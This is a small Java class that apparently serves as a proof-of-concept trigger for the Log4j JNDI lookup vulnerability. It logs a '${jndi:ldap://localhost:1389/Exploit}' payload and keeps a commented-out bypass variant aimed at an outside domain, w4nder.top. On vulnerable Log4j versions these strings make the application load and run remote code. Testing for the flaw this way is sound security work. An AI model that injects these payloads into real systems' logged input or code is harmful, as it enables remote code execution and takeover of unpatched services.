
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.builder.impl.DefaultConfigurationBuilder;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.lookup.ResourceBundleLookup;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;
import org.apache.logging.log4j.message.Message;
import org.apache.logging.log4j.message.ParameterizedMessage;

import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
//import org.junit.Test;

public class log4j {

    private static final Logger logger = LogManager.getLogger(log4j.class);
    public static void main(String[] args) throws UnknownHostException, URISyntaxException {
        logger.error("${jndi:ldap://localhost:1389/Exploit}");
//        logger.error("${jndi:ldap://127.0.0.1#.w4nder.top:1389/Exploit}");
    }

}
